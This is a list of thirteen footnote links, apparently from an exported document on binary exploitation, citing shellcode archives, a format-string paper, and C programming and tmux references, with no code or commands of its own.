[[1]](#ftnt_ref1) [https://en.wikipedia.org/wiki/Debug_symbol](https://www.google.com/url?q=https://en.wikipedia.org/wiki/Debug_symbol&sa=D&source=editors&ust=1653865765817948&usg=AOvVaw10-Sbvx5uab4E9BRbP7EzI) 

[[2]](#ftnt_ref2) [http://shell-storm.org/shellcode/files/shellcode-827.php](https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&sa=D&source=editors&ust=1653865765818443&usg=AOvVaw2V79n8_mQbcRFN6UJyxSG6) 

[[3]](#ftnt_ref3) [https://cs155.stanford.edu/papers/formatstring-1.2.pdf](https://www.google.com/url?q=https://cs155.stanford.edu/papers/formatstring-1.2.pdf&sa=D&source=editors&ust=1653865765818868&usg=AOvVaw1B21ux-YEaTFgNKTQSEZ0e) 

[[4]](#ftnt_ref4) [https://en.wikipedia.org/wiki/Printf_format_string](https://www.google.com/url?q=https://en.wikipedia.org/wiki/Printf_format_string&sa=D&source=editors&ust=1653865765819291&usg=AOvVaw0ijy6fx6uwCLKlvsRn0pWq) 

[[5]](#ftnt_ref5) [http://shell-storm.org/shellcode/files/shellcode-827.php](https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&sa=D&source=editors&ust=1653865765819708&usg=AOvVaw2tFX798AvE8fmXDLd_HCbd) 

[[6]](#ftnt_ref6) [http://shell-storm.org/shellcode/files/shellcode-606.php](https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&sa=D&source=editors&ust=1653865765820159&usg=AOvVaw0C45KTrdPmD1bAlZ13xzSz) 

[[7]](#ftnt_ref7)  [https://www.geeksforgeeks.org/udp-server-client-implementation-c/](https://www.google.com/url?q=https://www.geeksforgeeks.org/udp-server-client-implementation-c/&sa=D&source=editors&ust=1653865765820615&usg=AOvVaw1qYOIKa6LgcMl68faUKxdZ) 

[[8]](#ftnt_ref8) [https://github.com/tmux/tmux](https://www.google.com/url?q=https://github.com/tmux/tmux&sa=D&source=editors&ust=1653865765821020&usg=AOvVaw2SkIhzeH4xVPVNIjsbUS3a) 

[[9]](#ftnt_ref9) [https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world](https://www.google.com/url?q=https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world&sa=D&source=editors&ust=1653865765821457&usg=AOvVaw2s4pCASzpVuDQOGeobC9VM) 

[[10]](#ftnt_ref10) [https://nets.ec/Ascii_shellcode](https://www.google.com/url?q=https://nets.ec/Ascii_shellcode&sa=D&source=editors&ust=1653865765821871&usg=AOvVaw0Hs4moeXutsZw5ljokRKI_) 

[[11]](#ftnt_ref11) [https://www.tutorialspoint.com/cprogramming/c_command_line_arguments.htm](https://www.google.com/url?q=https://www.tutorialspoint.com/cprogramming/c_command_line_arguments.htm&sa=D&source=editors&ust=1653865765822316&usg=AOvVaw0uaULKSyjHk8ZqJRg0dX8t) 

[[12]](#ftnt_ref12) [https://en.wikipedia.org/wiki/Alphanumeric_shellcode](https://www.google.com/url?q=https://en.wikipedia.org/wiki/Alphanumeric_shellcode&sa=D&source=editors&ust=1653865765822735&usg=AOvVaw1-5xEQIasreKL2WrOrhZfg) 

[[13]](#ftnt_ref13) [http://shell-storm.org/shellcode/files/shellcode-606.php](https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&sa=D&source=editors&ust=1653865765823147&usg=AOvVaw1bzymHynnNSiyEF0TQSN4h)
